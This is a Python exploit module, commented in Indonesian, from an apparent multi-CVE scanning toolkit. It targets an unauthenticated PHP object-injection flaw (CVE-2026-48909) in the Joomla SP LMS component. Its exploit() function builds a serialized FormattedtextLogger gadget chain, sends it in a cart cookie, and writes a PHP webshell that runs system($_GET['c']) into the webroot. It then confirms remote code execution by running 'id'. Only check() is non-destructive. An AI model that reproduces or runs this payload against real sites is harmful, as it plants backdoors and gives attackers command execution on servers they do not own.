#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-48909 — SP LMS (com_splms < 4.1.4) — Unauthenticated PHP Object
Injection via **cookie keranjang** → arbitrary file write → RCE.

ROOT CAUSE (release notes resmi SP LMS 4.1.4: "object injection vulnerability
in cart cookie handling"):
    Komponen melakukan ``unserialize()`` atas cookie keranjang tanpa pembatasan
    kelas. Objek penyerang ter-instantiate; gadget ``__destruct()`` Joomla
    dipakai untuk MENULIS berkas PHP sembarang ke webroot.

GADGET (terverifikasi lab, Joomla 4.1.0):
    Joomla\\CMS\\Log\\Logger\\FormattedtextLogger::__destruct():
        if ($this->defer && !empty($this->deferredEntries)) {
            $this->initFile();
            $lines = array_map([$this,'formatLine'], $this->deferredEntries);
            File::append($this->path, implode("\\n", $lines) . "\\n");
        }
    ``$this->path`` = path berkas tujuan (KONTROL PENUH dari objek). Menyetel
    ``options['text_file_no_php']=1`` membuang header ``<?php die('Forbidden.');``
    sehingga isi berkas = payload PHP kita.

KETERBATASAN VERSI (penting):
    Joomla **>= 5.2.2** menambahkan ``FormattedtextLogger::__wakeup()`` yang
    melempar RuntimeException saat ``defer && deferredEntries`` — persis kondisi
    yang dibutuhkan rantai ini. Runtime >= 5.2.2 = RCE DIBLOKIR (terbukti lab:
    5.4.8 → error, berkas tidak tertulis). 4.1.0 → RCE (uid=33(www-data)).

NOTE PROSES: payload di-encode TANPA byte NUL (nama prop protected ditulis
plain: ``s:7:"options"`` bukan ``s:10:"\\0*\\0options"``) agar aman lewat cookie.
"""
from __future__ import annotations

import re
import urllib.parse

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_VULN,
                detect_platform, parse_ver, register, ver_lt)

DETECT_PATHS = [
    "/components/com_splms/com_splms.php",
    "/administrator/components/com_splms/splms.php",
    "/media/com_splms/",
]

# Kandidat endpoint front-end yang menyentuh handler keranjang komponen.
CART_URLS = [
    "/index.php?option=com_splms",
    "/index.php?option=com_splms&view=cart",
    "/index.php?option=com_splms&task=cart.display",
    "/index.php?option=com_splms&view=cart&format=raw",
    "/index.php?option=com_splms&format=raw",
]

MANIFEST = "/administrator/manifests/files/joomla.xml"
GUARD_VERSION = (5, 2, 2)   # __wakeup guard ditambahkan di sini
SHELL_MARK = "MP48909RCE"
# nama cookie keranjang yang umum dipakai komponen e-commerce
CART_COOKIES = ["splms_cart", "cart", "splms_cart_data", "splmscart"]

# Kelas gadget nyata (nama FQCN) — dipakai pada payload.
GADGET_CLASS = r"Joomla\CMS\Log\Logger\FormattedtextLogger"
ENTRY_CLASS = r"Joomla\CMS\Log\LogEntry"


def _opt(o, k):
    if o is None:
        return None
    if isinstance(o, dict):
        return o.get(k)
    return getattr(o, k, None)


def _detect(t, h):
    for p in DETECT_PATHS:
        r = h.get(f"{t.url}{p}")
        if r is not None and r.status_code in (200, 403):
            return True, p
    r = h.get(t.url)
    if r is not None and "com_splms" in (r.text or "").lower():
        return True, "/ (markup)"
    return False, ""


def _joomla_version(t, h):
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    r = h.get(f"{t.url}{MANIFEST}")
    val = (None, "")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _payload(shell_name: str, cmd_param: str = "c") -> str:
    """Buat string serialized FormattedtextLogger (TANPA byte NUL).

    Menulis berkas PHP ``shell_name`` di lokasi path (relatif = cwd webroot).
    """
    php = f'<?php echo "{SHELL_MARK}:"; system($_GET["{cmd_param}"]); ?>'
    # LogEntry: `date` 10-char + `time` di-set -> formatLine() tidak memanggil Date
    entry = (
        f'O:{len(ENTRY_CLASS)}:"{ENTRY_CLASS}":6:{{'
        f's:8:"category";s:1:"x";'
        f's:4:"date";s:10:"2026-01-01";'
        f's:4:"time";s:8:"00:00:00";'
        f's:8:"priority";i:1;'
        f's:8:"clientIP";s:9:"127.0.0.1";'
        f's:7:"message";s:{len(php)}:"{php}";'
        f'}}'
    )
    logger = (
        f'O:{len(GADGET_CLASS)}:"{GADGET_CLASS}":7:{{'
        f's:7:"options";a:1:{{s:16:"text_file_no_php";i:1;}}'
        f's:10:"priorities";a:1:{{i:1;s:4:"INFO";}}'
        f's:6:"format";s:9:"{{MESSAGE}}";'
        f's:6:"fields";a:1:{{i:0;s:7:"MESSAGE";}}'
        f's:4:"path";s:{len(shell_name)}:"{shell_name}";'
        f's:5:"defer";b:1;'
        f's:15:"deferredEntries";a:1:{{i:0;{entry}}}'
        f'}}'
    )
    return logger


def _send_cookie(h, t, url, cookie_name, payload):
    # WAJIB percent-encode: payload serialized memuat ';' yang akan memotong
    # nilai cookie bila dikirim mentah. PHP otomatis men-decode %XX.
    enc = urllib.parse.quote(payload, safe="")
    headers = {"Cookie": f"{cookie_name}={enc}"}
    r = h.get(f"{t.url}{url}", headers=headers)
    return r


def check(t, h, opts):
    """NON-DESTRUKTIF: deteksi komponen + baca versi Joomla (guard).

    Tidak mengirim payload (menulis berkas = destruktif). Hanya menyatakan
    precondition. VULN TIDAK diklaim dari rentang versi saja (aturan proyek).
    """
    if detect_platform(t, h) != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, trace = _detect(t, h)
    if not found:
        return ST_CLEAN, "SP LMS (com_splms) tidak terdeteksi", ""

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return (ST_INFO,
                "com_splms terdeteksi; versi Joomla tidak terbaca "
                "(guard >= 5.2.2 tak dapat dipastikan)",
                f"detect={trace} versi=?", )
    if not ver_lt(ver, GUARD_VERSION):
        return (ST_CLEAN,
                f"Joomla {ver_s} >= 5.2.2 — __wakeup() memblokir rantai gadget",
                f"detect={trace} versi={ver_s}")
    return (ST_INFO,
            f"com_splms hadir & Joomla {ver_s} < 5.2.2 — precondition object-"
            f"injection terpenuhi (belum diverifikasi tulis; jalankan --exploit)",
            f"detect={trace} versi={ver_s}")


def exploit(t, h, opts):
    """Gated --exploit: kirim cookie gadget + verifikasi EKSEKUSI berkas."""
    if detect_platform(t, h) != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, trace = _detect(t, h)
    if not found:
        return ST_SKIP, "SP LMS tidak terdeteksi", ""

    ver, ver_s = _joomla_version(t, h)
    if ver is not None and not ver_lt(ver, GUARD_VERSION):
        return (ST_CLEAN,
                f"Joomla {ver_s} >= 5.2.2 — rantai gadget diblokir __wakeup()",
                f"detect={trace} versi={ver_s}")

    cmd_param = "c"
    shell_name = "mp48909_%d.php" % (abs(hash(t.url)) % 100000)
    payload = _payload(shell_name, cmd_param)

    for url in CART_URLS:
        for ck in CART_COOKIES:
            _send_cookie(h, t, url, ck, payload)
            v = h.get(f"{t.url}/{shell_name}?{cmd_param}=id")
            if v is None or v.status_code != 200:
                continue
            body = v.text or ""
            if SHELL_MARK in body and re.search(r"uid=\d+\(", body):
                uid = re.search(r"uid=\d+\([^)]*\)", body)
                return (ST_PWN,
                        "RCE TERVERIFIKASI — object-injection cookie → berkas "
                        "PHP tertulis & dieksekusi",
                        f"{t.url}/{shell_name} -> {uid.group(0) if uid else 'uid?'}")
            if SHELL_MARK in body:
                return (ST_INFO, "berkas tertulis tapi output tak terduga",
                        f"{t.url}/{shell_name} -> {body[:80]}")
    return (ST_CLEAN, "tidak ada berkas yang terwujud", f"detect={trace} versi={ver_s}")


register(CveModule(
    cve="CVE-2026-48909",
    cluster="joomla_ext",
    title="Joomla Ext - SP LMS (com_splms) unauth object injection (cart cookie) -> RCE",
    vclass="rce",
    cwe="CWE-502",
    product="SP LMS (com_splms)",
    versions_affected="< 4.1.4 (Joomla < 5.2.2)",
    status="verified",
    requires=["komponen com_splms < 4.1.4 terpasang",
              "Joomla < 5.2.2 (tanpa __wakeup guard pada FormattedtextLogger)"],
    check=check,
    exploit=exploit,
    notes=("Vektor sebenarnya adalah unserialize() pada COOKIE KERANJANG "
           "(bukan upload lesson.save seperti klaim x.py). Gadget "
           "FormattedtextLogger::__destruct menulis berkas .php sembarang "
           "(path kontrol penuh). TERVERIFIKASI lab end-to-end pada Joomla "
           "4.1.0: cookie -> unserialize -> berkas webroot -> HTTP "
           "uid=33(www-data), DAN melalui modul ini sendiri via HTTP "
           "(mp.py --exploit -> PWN). DIBLOKIR pada Joomla >= 5.2.2 oleh "
           "FormattedtextLogger::__wakeup() (terbukti: 5.4.8 tidak menulis "
           "berkas). check() hanya precondition (versi + deteksi), tidak "
           "menulis; exploit() mengirim payload cookie & memverifikasi "
           "EKSEKUSI. Bukti: notes/CVE-2026-48909-48939-56290-lab-verdict.md, "
           "lab/j410-48909/."),
))
